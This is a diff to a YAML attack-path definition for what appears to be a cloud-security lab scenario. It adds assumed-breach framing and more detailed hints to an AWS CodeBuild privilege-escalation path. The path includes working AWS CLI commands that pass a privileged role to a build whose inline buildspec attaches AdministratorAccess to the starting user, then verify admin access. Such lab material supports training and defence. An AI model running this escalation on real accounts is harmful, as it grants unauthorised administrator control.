@@ -5,6 +5,8 @@ attackMap:
       type: principal
       subType: iam-user
       arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
       description: >
         You have gained access to this principal's AWS IAM credentials. These could
         have been obtained through many real-world vectors: phishing a developer and
@@ -49,15 +51,17 @@ attackMap:
         service role. This binds the role's permissions to any builds executed within
         this project.
       hints:
-        - "You can create AWS CodeBuild projects and pass IAM roles to them."
-        - "Look for privileged roles that trust the CodeBuild service and that you can pass."
-        - "A custom buildspec executed by a privileged service role can modify IAM policies on your behalf."
+        - "Use iam:ListRoles to discover IAM roles in the account — look for ones whose trust policy allows the CodeBuild service principal to assume them."
+        - "Check which roles your iam:PassRole permission is scoped to — that tells you exactly which role you can delegate to a CodeBuild project."
+        - "A CodeBuild project's --service-role parameter determines what IAM identity the build runs as. Passing a privileged role here means the buildspec can perform any action that role can."
+        - "The buildspec is just a YAML document with shell commands. Think about what AWS CLI commands the target role can run, and write those commands into the buildspec."
+        - "You do not need an existing source repository — CodeBuild supports type=NO_SOURCE, so you can supply an inline buildspec directly."
         - "Browse to https://pathfinding.cloud/paths/codebuild-001 for technique details."
       commands:
         - description: "Create CodeBuild project with the privileged service role"
           command: |
             aws codebuild create-project \
-              --name pl-prod-codebuild-001-privesc-project \
+              --name pl-privesc-codebuild-demo \
               --source type=NO_SOURCE,buildspec="version: 0.2\nphases:\n  build:\n    commands:\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" \
               --artifacts type=NO_ARTIFACTS \
               --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0 \
@@ -71,12 +75,14 @@ attackMap:
         of the build. The buildspec executes iam:AttachUserPolicy under the role's
         permissions, attaching AdministratorAccess to the starting user.
       hints:
-        - "The build executes with the permissions of the service role assigned to the project."
-        - "You can override the buildspec inline when starting a build."
+        - "Trigger the build with codebuild:StartBuild — capture the build ID from the response so you can track its progress."
+        - "Use codebuild:BatchGetBuilds with the build ID to poll for completion status; the build typically takes 30-60 seconds."
+        - "Once the build status shows SUCCEEDED, wait an additional ~15 seconds for IAM policy propagation before verifying your new permissions."
+        - "Verify the escalation worked by attempting an action your starting user previously could not perform, such as listing IAM users."
       commands:
         - description: "Start the build to execute the privilege escalation"
-          command: "aws codebuild start-build --project-name pl-prod-codebuild-001-privesc-project"
-        - description: "Wait for the build to complete"
-          command: "aws codebuild batch-get-builds --ids <build-id>"
+          command: "aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json"
+        - description: "Poll until the build completes"
+          command: "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus' --output text"
         - description: "Verify administrator access"
           command: "aws iam list-users --max-items 1"
